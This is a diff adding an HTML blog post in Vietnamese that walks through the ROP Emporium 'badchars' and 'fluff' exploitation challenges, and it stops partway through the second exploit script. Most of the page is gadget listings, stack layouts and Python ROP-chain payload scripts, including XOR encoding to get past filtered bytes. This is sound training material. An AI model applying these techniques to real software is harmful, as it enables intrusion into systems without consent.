@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="vi">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="./theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="./theme/css/custom.css" media="screen">
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="minix" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="binary, exploit, rop, x64, Trang chủ, " />
+
+<meta property="og:title" content="Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 2 "/>
+<meta property="og:url" content="./pwn2.html" />
+<meta property="og:description" content="Bad chars Challenge 5 cũng tương tự challenge 4 Write 4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb Như vậy ta cần tránh các ký tự 4 kí tự là “x”, “g”, “a …" />
+<meta property="og:site_name" content="FAMILUG.org Vietnam" />
+<meta property="og:article:author" content="minix" />
+<meta property="og:article:published_time" content="2023-10-17T00:00:00+07:00" />
+<meta name="twitter:title" content="Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 2 ">
+<meta name="twitter:description" content="Bad chars Challenge 5 cũng tương tự challenge 4 Write 4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb Như vậy ta cần tránh các ký tự 4 kí tự là “x”, “g”, “a …">
+
+        <title>Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 2  · FAMILUG.org Vietnam
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="./"><span class=site-name>FAMILUG.org Vietnam</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       .
+                                    >Home</a>
+                                </li>
+                                <li ><a href="./categories.html">Categories</a></li>
+                                <li ><a href="./tags.html">Tags</a></li>
+                                <li ><a href="./archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="./search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+                <div class="row-fluid">
+                    <div class="span1"></div>
+                    <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset2">
+        <h1>
+            <a href="./pwn2.html">
+                Học khai thác lỗ hổng bảo mật qua ROP Emporium - Part 2
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset2 article-content">
+            
+            <h2>Bad chars</h2>
+<p>Challenge 5 cũng tương tự challenge 4 Write 4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb</p>
+<p><img alt="" src="./images/ropemporium-2/Bad chars/image.png"></p>
+<p>Như vậy ta cần tránh các ký tự 4 kí tự là “x”,  “g”, “a” ,“.”</p>
+<p>Và để tránh truyền các ký tự này ta sẽ truyền vào string “flag.txt” đã được encrypt từng byte bằng phép xor với 0x50 (chọn key để tránh các kí tự trên) và sử dụnng gadget xor để decrypt trước khi thực thi </p>
+<p>Tiến hành lấy địa chỉ các gadget cần thiết</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">badchars</span><span class="w"></span>
+<span class="o">[</span><span class="n">Imports</span><span class="o">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mi">4</span><span class="w">   </span><span class="mh">0x00400510</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">print_file</span><span class="w"></span>
+
+<span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">badchars</span><span class="w"></span>
+<span class="o">[</span><span class="n">Sections</span><span class="o">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">        </span><span class="k">size</span><span class="w"> </span><span class="n">vaddr</span><span class="w">       </span><span class="n">vsize</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="mi">23</span><span class="w">  </span><span class="mh">0x00001028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="mh">0x00601028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"></span>
+
+<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">badchars</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mh">0x000000000040069c</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r13</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r14</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x00000000004006a3</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x00000000004004ee</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x0000000000400628</span><span class="err">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r15</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r14b</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x0000000000400634</span><span class="err">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r13</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x00000000004006a2</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Build stack như sau</p>
+<div class="highlight"><pre><span></span><code><span class="o">---&gt;</span><span class="w"> </span><span class="k">Load</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="k">section</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"></span>
+<span class="o">[</span><span class="n">A*8  </span><span class="o">]</span><span class="w"></span>
+<span class="o">[</span><span class="n">.....</span><span class="o">]</span><span class="w"></span>
+<span class="o">[</span><span class="n">A*8  </span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">40</span><span class="o">*</span><span class="n">A</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x40069c</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r13</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r14</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">encrypted_flag</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="ss">&quot;flag.txt&quot;</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">r12</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x601028 + 7</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">r13</span><span class="p">;</span><span class="w"> </span><span class="n">Vì</span><span class="w"> </span><span class="mh">0x601028</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x60102e</span><span class="w"> </span><span class="n">có</span><span class="w"> </span><span class="mh">0x2e</span><span class="w"> </span><span class="n">là</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="n">nên</span><span class="w"> </span><span class="n">ta</span><span class="w"> </span><span class="n">cộng</span><span class="w"> </span><span class="n">thêm</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="n">địa</span><span class="w"> </span><span class="n">chỉ</span><span class="w"></span>
+<span class="o">[</span><span class="n">key</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">encrypt</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">r14</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x601028</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">r15</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x400634</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r13</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">lấy</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="s1">&#39;flag.txt&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">r12</span><span class="p">)</span><span class="w"> </span><span class="n">lưu</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"> </span><span class="p">(</span><span class="n">r13</span><span class="p">)</span><span class="w"></span>
+<span class="o">---&gt;</span><span class="w"> </span><span class="n">Lặp</span><span class="w"> </span><span class="n">lại</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">với</span><span class="w"> </span><span class="n">mỗi</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">trong</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">lưu</span><span class="w"> </span><span class="n">tại</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x400628</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r15</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r14b</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4006a2</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x601028 + 7 + i</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Với</span><span class="w">  </span><span class="mi">1</span><span class="o">&lt;=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x400628</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r15</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r14b</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">cuối</span><span class="w"> </span><span class="n">của</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="n">flag</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4006a3</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x601028 + 7</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">arg1</span><span class="w"> </span><span class="n">của</span><span class="w"> </span><span class="n">print_file</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4004ee</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x400510</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">print_file</span><span class="p">();</span><span class="w"></span>
+</code></pre></div>
+
+<p>Dựa trên stack như trên ta build payload sử dụng python và struct module</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="n">data_loc_addr</span> <span class="o">=</span> <span class="mh">0x601028</span> <span class="o">+</span> <span class="mi">7</span> <span class="c1"># because 0x601028 + 0x6 = 0x60102e and 0x2e is &#39;.&#39; in badchars</span>
+<span class="n">key</span> <span class="o">=</span> <span class="mh">0x50</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;flag.txt&#39;</span>
+<span class="n">enc_filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+    <span class="n">enc_filename</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x40069c</span><span class="p">)</span> <span class="c1"># pop r12; pop r13; pop r14; pop r15; ret;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">enc_filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1"># r12</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_loc_addr</span><span class="p">)</span> <span class="c1"># r13</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="c1"># r14</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_loc_addr</span><span class="p">)</span> <span class="c1"># r15</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400634</span><span class="p">)</span> <span class="c1"># mov qword ptr [r13], r12; ret;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400628</span><span class="p">)</span> <span class="c1"># xor byte ptr [r15], r14b; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4006a2</span><span class="p">)</span> <span class="c1"># pop r15; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_loc_addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400628</span><span class="p">)</span> <span class="c1"># xor byte ptr [r15], r14b; ret;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4006a3</span><span class="p">)</span> <span class="c1"># pop rdi; ret;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_loc_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4004ee</span><span class="p">)</span> <span class="c1"># ret;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400510</span><span class="p">)</span> <span class="c1"># print_file</span>
+
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<h2>Fluff</h2>
+<p>Challenge 6 tương tự challenge 4 Write 4 nhưng ta sẽ dùng các gadget mới hơn để xây dựng ROP chain</p>
+<p>Tiến hành lấy các gadget cần thiết</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">fluff</span><span class="w"></span>
+<span class="o">[</span><span class="n">Imports</span><span class="o">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mi">4</span><span class="w">   </span><span class="mh">0x00400510</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">print_file</span><span class="w"></span>
+
+<span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">fluff</span><span class="w"></span>
+<span class="o">[</span><span class="n">Sections</span><span class="o">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">        </span><span class="k">size</span><span class="w"> </span><span class="n">vaddr</span><span class="w">       </span><span class="n">vsize</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="mi">23</span><span class="w">  </span><span class="mh">0x00001028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="mh">0x00601028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"></span>
+
+<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">badchars</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mh">0x000000000040062a</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rcx</span><span class="p">;</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3ef2</span><span class="p">;</span><span class="w"> </span><span class="n">bextr</span><span class="w"> </span><span class="n">rbx</span><span class="p">,</span><span class="w"> </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x0000000000400639</span><span class="err">:</span><span class="w"> </span><span class="n">stosb</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdi</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">al</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x0000000000400628</span><span class="err">:</span><span class="w"> </span><span class="n">xlatb</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x00000000004006a3</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="mh">0x0000000000400295</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Ở đây ta thiếu các gadget như challenge 4 để truyền string “flag.txt” vào .data section.</p>
+<p>Ta dùng gadget <code>stosb byte ptr [rdi], al; ret;</code> để truyền giá trị thanh ghi <code>al</code> vào <code>[rdi]</code> với rdi là địa chỉ section .data được control bằng gadget  <code>pop rdi; ret;</code>. Lưu ý rdi sẽ tự add 0x1 vào mỗi lần thực thi gadget này</p>
+<p>Để control thanh ghi <code>al</code> ta sử dụng gadget <code>xlatb; ret;</code> xlatb sẽ tương đương gán <code>al = rbx + al</code>. Do đó khi control được <code>rbx</code> ta sẽ  điều chỉnh được thanh ghi <code>al</code> <a href="https://www.felixcloutier.com/x86/xlat:xlatb">https://www.felixcloutier.com/x86/xlat:xlatb</a></p>
+<p>Để control rbx ta sẽ dùng gadget <code>pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;</code>, với instruction <code>bextr rbx, rcx, rdx; ret;</code> sẽ trích xuất các bit liên tục từ start <code>rcx</code> với length <code>rdx</code> (rcx lấy bit từ 0:7, rdx lấy bit từ 8:15)</p>
+<p>Ta xây dựng stack như sau</p>
+<div class="highlight"><pre><span></span><code><span class="k">[A*8  ]</span><span class="w"></span>
+<span class="k">[.....]</span><span class="w"></span>
+<span class="na">[A*8  ] -&gt; 40*A</span><span class="w"></span>
+<span class="na">[0x4006a3] -&gt; pop rdi; ret;</span><span class="w"></span>
+<span class="na">[0x601028] -&gt; -rw- .data -&gt; control rdi cho gadget stosb</span><span class="w"></span>
+<span class="na">---&gt; Control al, lấy từng ký tự &#39;flag.txt&#39;</span><span class="w"></span>
+<span class="na">[0x40062a] -&gt; pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;</span><span class="w"></span>
+<span class="na">[0x4000] -&gt; rdx -&gt; length bit [8:15]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">0x40 (8 bits = 1 byte)</span><span class="w"></span>
+<span class="na">[base + index - 0x3ef2 - current_al] -&gt; base + index là vị trí của từng ký tự &#39;flag.txt&#39; trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al :</span><span class="o">=</span><span class="w"> </span><span class="s">rbx + al và trừ đi 0x3e2f do instruction &#39;add rcx, 0x3ef2&#39; khi đó al := giá trị tại vị trí của &#39;flag.txt&#39;</span><span class="w"></span>
+<span class="na">[0x400628] -&gt; xlatb; ret;</span><span class="w"></span>
+<span class="na">[0x400639] -&gt; stosb byte ptr [rdi], al; ret;</span><span class="w"></span>
+<span class="na">----&gt; Sau khi lấy hết ký tự &#39;flag.txt&#39; vào rdi, ta truyền vào hàm print_file()</span><span class="w"></span>
+<span class="na">[0x4006a3] -&gt; pop rdi; ret;</span><span class="w"></span>
+<span class="na">[0x400295] -&gt; ret;</span><span class="w"></span>
+<span class="na">[0x400510] -&gt; print_file();</span><span class="w"></span>
+</code></pre></div>
+
+<p>Exploit code</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mh">0x4000</span> <span class="c1">#length bits, bit from  15:8 is 0x40 -&gt; 64 bit, 8 byte</span>
+<span class="n">xlatb</span> <span class="o">=</span> <span class="mh">0x0000000000400628</span> <span class="c1"># xlatb; ret;</span>
+<span class="n">bextr</span> <span class="o">=</span> <span class="mh">0x000000000040062a</span> <span class="c1"># pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;</span>
+<span class="n">stosb</span> <span class="o">=</span> <span class="mh">0x0000000000400639</span> <span class="c1"># stosb byte ptr [rdi], al; ret;</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004006a3</span> <span class="c1"># pop rdi; ret;</span>
+<span class="n">data_section_addrs</span> <span class="o">=</span> <span class="mh">0x00601028</span>
+<span class="n">print_file_addrs</span> <span class="o">=</span> <span class="mh">0x00400510</span> <span class="c1"># 4   0x00400510 GLOBAL FUNC       print_file</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000400295</span> <span class="c1"># ret;</span>
+<span class="n">current_rax</span> <span class="o">=</span> <span class="mh">0xb</span>
+
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">find_index</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">):</span>
+    <span class="n">indexes</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;fluff&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">buff</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+            <span class="n">indexes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">buff</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="s1">&#39;ascii&#39;</span><span class="p">)))</span>
+    <span class="k">return</span> <span class="n">indexes</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;flag.txt&#39;</span>
+<span class="n">filename_index</span> <span class="o">=</span> <span class="n">find_index</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span> <span class="c1"># index of char in binary to create string &#39;flag.txt&#39;</span>
+
